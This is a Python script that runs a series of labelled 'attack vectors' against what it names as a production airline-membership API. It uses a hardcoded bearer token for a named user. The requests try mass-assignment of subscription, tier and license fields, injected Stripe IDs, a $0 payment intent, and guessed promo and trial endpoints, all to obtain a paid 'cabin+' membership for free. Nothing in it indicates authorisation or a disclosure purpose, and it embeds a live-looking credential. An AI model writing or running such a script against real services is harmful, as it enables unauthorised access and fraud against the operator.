#!/usr/bin/env python3
"""
Comprehensive testing: Can we get Ashley cabin+ membership on PRODUCTION API?
"""

import requests
import json
import time

PROD_URL = "https://vauntapi.flyvaunt.com"
ASHLEY_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoxNzEyMDgsImlhdCI6MTc2MjIyNTUwMSwiZXhwIjoxNzY0ODE3NTAxfQ.TtZeO8zr_3aoLe21AmLGMsLj-ACxXqBh6cKNph_9dYg"

def make_request(method, endpoint, data=None):
    """Make authenticated request"""
    headers = {
        "Authorization": f"Bearer {ASHLEY_TOKEN}",
        "Content-Type": "application/json"
    }
    
    url = f"{PROD_URL}{endpoint}"
    
    try:
        if method == "GET":
            r = requests.get(url, headers=headers, timeout=10)
        elif method == "PATCH":
            r = requests.patch(url, headers=headers, json=data, timeout=10)
        elif method == "POST":
            r = requests.post(url, headers=headers, json=data, timeout=10)
        elif method == "PUT":
            r = requests.put(url, headers=headers, json=data, timeout=10)
        
        result = {"status": r.status_code, "data": None}
        if r.status_code == 200 and r.text:
            try:
                result["data"] = r.json()
            except:
                result["data"] = r.text[:200]
        return result
    except Exception as e:
        return {"status": "error", "error": str(e)}

def get_ashley_status():
    """Get Ashley's current membership status"""
    r = make_request("GET", "/v1/user")
    if r['status'] == 200 and r['data']:
        return {
            "subscriptionStatus": r['data'].get('subscriptionStatus'),
            "membershipTier": r['data'].get('membershipTier'),
            "priorityScore": r['data'].get('priorityScore'),
            "license": r['data'].get('license')
        }
    return None

print("="*80)
print("ASHLEY RAGER - CABIN+ MEMBERSHIP ATTACK TESTING (PRODUCTION)")
print("="*80)

# Get baseline
print("\n📊 BASELINE - Ashley's Current Status:")
baseline = get_ashley_status()
if baseline:
    print(f"   Subscription Status: {baseline['subscriptionStatus']}")
    print(f"   Membership Tier: {baseline['membershipTier']}")
    print(f"   Priority Score: {baseline['priorityScore']}")
    print(f"   License: {baseline['license']}")
else:
    print("   ❌ Could not get baseline data")

print("\n" + "="*80)
print("ATTACK VECTOR TESTING")
print("="*80)

# Test all possible attack vectors
attacks = [
    {
        "name": "Vector 1: Direct subscriptionStatus modification",
        "method": "PATCH",
        "endpoint": "/v1/user",
        "data": {"subscriptionStatus": 3}
    },
    {
        "name": "Vector 2: membershipTier modification",
        "method": "PATCH",
        "endpoint": "/v1/user",
        "data": {"membershipTier": "cabin+"}
    },
    {
        "name": "Vector 3: Combined membership fields",
        "method": "PATCH",
        "endpoint": "/v1/user",
        "data": {
            "subscriptionStatus": 3,
            "membershipTier": "cabin+",
            "priorityScore": 1931577847
        }
    },
    {
        "name": "Vector 4: License modification",
        "method": "PATCH",
        "endpoint": "/v1/user",
        "data": {
            "license": {
                "membershipTier": {"name": "cabin+", "priorityLevel": 2},
                "expiresAt": 1766707200000
            }
        }
    },
    {
        "name": "Vector 5: Stripe subscription fields",
        "method": "PATCH",
        "endpoint": "/v1/user",
        "data": {
            "stripeSubscriptionId": "sub_1RXC7YBkrWmvysmuXyGVEYPF",
            "stripeCustomerId": "cus_PlS5D89fzdDYgF"
        }
    },
    {
        "name": "Vector 6: Subscription restore",
        "method": "POST",
        "endpoint": "/v1/subscription/restore",
        "data": None
    },
    {
        "name": "Vector 7: Create license",
        "method": "POST",
        "endpoint": "/v1/user/license",
        "data": {"membershipTier": "cabin+"}
    },
    {
        "name": "Vector 8: Payment intent with $0",
        "method": "POST",
        "endpoint": "/v1/subscription/paymentIntent",
        "data": {"amount": 0, "membershipTier": "cabin+"}
    },
    {
        "name": "Vector 9: Activate subscription",
        "method": "POST",
        "endpoint": "/v1/subscription/activate",
        "data": {"membershipTier": "cabin+"}
    },
    {
        "name": "Vector 10: Update subscription",
        "method": "PUT",
        "endpoint": "/v1/user/subscription",
        "data": {"tier": "cabin+", "status": 3}
    },
    {
        "name": "Vector 11: Referral bonus (might grant trial)",
        "method": "POST",
        "endpoint": "/v1/user/referral",
        "data": {"code": "CABIN"}
    },
    {
        "name": "Vector 12: Apply promo code",
        "method": "POST",
        "endpoint": "/v1/promo/apply",
        "data": {"code": "FREECABINPLUS"}
    },
    {
        "name": "Vector 13: Trial activation",
        "method": "POST",
        "endpoint": "/v1/subscription/trial",
        "data": {"tier": "cabin+"}
    },
]

successful_attacks = []

for i, attack in enumerate(attacks, 1):
    print(f"\n{'='*80}")
    print(f"🔥 {attack['name']}")
    print(f"{'='*80}")
    print(f"   {attack['method']} {attack['endpoint']}")
    
    result = make_request(attack['method'], attack['endpoint'], attack['data'])
    
    print(f"   Status: {result['status']}")
    
    if result['status'] == 200:
        print("   ✅ Request accepted!")
        
        # Check if membership changed
        time.sleep(0.5)
        new_status = get_ashley_status()
        
        if new_status:
            changed = False
            changes = []
            
            if new_status['subscriptionStatus'] != baseline['subscriptionStatus']:
                changes.append(f"subscriptionStatus: {baseline['subscriptionStatus']} → {new_status['subscriptionStatus']}")
                changed = True
            
            if new_status['membershipTier'] != baseline['membershipTier']:
                changes.append(f"membershipTier: {baseline['membershipTier']} → {new_status['membershipTier']}")
                changed = True
            
            if new_status['priorityScore'] != baseline['priorityScore']:
                changes.append(f"priorityScore: {baseline['priorityScore']} → {new_status['priorityScore']}")
                changed = True
            
            if changed:
                print(f"\n   🚨🚨🚨 MEMBERSHIP CHANGED! 🚨🚨🚨")
                for change in changes:
                    print(f"   {change}")
                successful_attacks.append({
                    "attack": attack['name'],
                    "changes": changes
                })
                baseline = new_status  # Update baseline
            else:
                print("   ❌ No membership changes detected")
    
    elif result['status'] == 404:
        print("   ❌ Endpoint not found")
    elif result['status'] == 401:
        print("   ❌ Unauthorized")
    elif result['status'] == 403:
        print("   ❌ Forbidden")
    else:
        print(f"   ❌ Failed: {result.get('error', 'Unknown error')}")

# Final status check
print("\n" + "="*80)
print("FINAL RESULTS")
print("="*80)

final_status = get_ashley_status()
if final_status:
    print(f"\n📊 Ashley's Final Status:")
    print(f"   Subscription Status: {final_status['subscriptionStatus']}")
    print(f"   Membership Tier: {final_status['membershipTier']}")
    print(f"   Priority Score: {final_status['priorityScore']}")
    
    if final_status['subscriptionStatus'] == 3:
        print("\n   ✅✅✅ SUCCESS! Ashley now has Cabin+ (subscriptionStatus = 3)!")
    elif final_status['membershipTier'] == 'cabin+':
        print("\n   ✅✅✅ SUCCESS! Ashley now has Cabin+ membership!")
    else:
        print("\n   ❌ No cabin+ access obtained")

if successful_attacks:
    print(f"\n🎯 SUCCESSFUL ATTACKS: {len(successful_attacks)}")
    for attack in successful_attacks:
        print(f"\n   ✅ {attack['attack']}")
        for change in attack['changes']:
            print(f"      - {change}")
else:
    print("\n❌ NO SUCCESSFUL ATTACKS - All security measures working")

print("\n" + "="*80)
